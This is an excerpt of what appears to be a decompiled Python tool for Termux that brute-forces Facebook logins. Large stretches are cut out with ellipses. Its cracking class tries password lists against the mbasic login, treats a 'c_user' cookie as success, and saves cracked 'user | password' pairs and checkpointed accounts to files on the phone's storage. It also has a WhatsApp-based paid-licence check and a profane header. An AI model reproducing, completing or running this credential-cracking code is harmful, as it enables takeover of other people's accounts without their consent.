# Decompile by : 'USAMA ALBALOSHI
#FUCKYOU-BITCH 
import os,sys
try: import requests
except ModuleNotFoundError:print("OSAMA Install Module requests");os.system("python -m pip install requests &> /dev/WASI")
try: import bs4
except ModuleNotFoundError:print("OSAMA Install Module bs4");os.system("python -m pip install bs4 &> /dev/WASI")
try: import mechanize
except ModuleNotFoundError:print("OSAMA Install Module mechanize");os.system("python -m pip install mechanize &> /dev/WASI")
try: import gTTS
...
def main_apv():
    ...
    try:
        ...
        logo()
        print ("\033[1;97m-----------------------------------------------")
        print (" You Have Not Subscription Yet")
        print ("\033[1;97m-----------------------------------------------")
        print (" This Your Token")
        myid=uuid.uuid4().hex[:10].upper()
        print (" Your Token : "+ak+myid)
        print ("\033[1;97m-----------------------------------------------")
        kok=open('/data/data/com.termux/files/usr/bin/.wasi-cov', 'w')
        kok.close()
        print ("")
        print ("")
        print (" Copy Your Token And Send to Developer On WhatsApp For Approvel")
        print ("\033[1;97m-----------------------------------------------")
        time.sleep(6)
    ...
    if key1 in r1:
        ...
        print ("\033[1;97m-----------------------------------------------")
        print (" This Your Token")
        print (" Your Token : "+ak+key1)
        print ("\033[1;97m-----------------------------------------------")
        print (" Copy Your Token And Send to Developer On WhatsApp For Approvel")
        print ("\033[1;97m-----------------------------------------------")
        time.sleep(3.5)
        os.system("xdg-open https://wa.me/+923317394634")
...
def R():
			...
			print("\033[1;97m[2] CONTACT DEVELOPER ")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;37m[\033[1;91m<\033[1;37mXXX\033[1;32m>\033[1;37m] \033[1;97m%s|%s \033[1;92m[OK-:%s] \033[1;91m[CP-:%s] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[TOR-OK] %s | %s      ' % (user,pw))
				wrt = '%s | %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/OSAMA-OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/OSAMA-CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[NAZIR-CP] %s | %s%s      ' % (user,pw,tahun(user)))
	...
	def __pler__(self):
		...
		if yan == '':
			...
			time.sleep(1)
			print('\n[•] Result OK saved to TOOR-OK.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			print("\033[1;97m[\033[1;92m<\033[1;91m>\033[1;97m]